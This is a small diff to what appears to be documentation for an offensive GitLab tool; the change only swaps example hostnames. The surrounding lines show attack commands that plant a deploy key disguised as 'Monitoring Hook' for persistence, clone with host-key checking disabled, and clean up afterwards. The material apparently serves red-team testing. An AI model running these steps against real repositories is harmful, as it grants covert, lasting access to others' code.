@@ -55,7 +55,7 @@ Verify access:
 
 ```bash
 GIT_SSH_COMMAND="ssh -i ./deploy_key -o StrictHostKeyChecking=no" \
-  git clone git@gitlab.example.com:group/project.git
+  git clone git@gitlab.local:group/project.git
 ```
 
 ### Step 3: Member addition persistence
@@ -124,7 +124,7 @@ gogatoz attack --target group/project --deploy-key \
   --key-path ./dk --key-title "Monitoring Hook"
 
 # Verify
-GIT_SSH_COMMAND="ssh -i ./dk" git ls-remote git@gitlab.example.com:group/project.git
+GIT_SSH_COMMAND="ssh -i ./dk" git ls-remote git@gitlab.local:group/project.git
 
 # Cleanup
 gogatoz attack --target group/project --cleanup --revoke-deploy-key <ID>
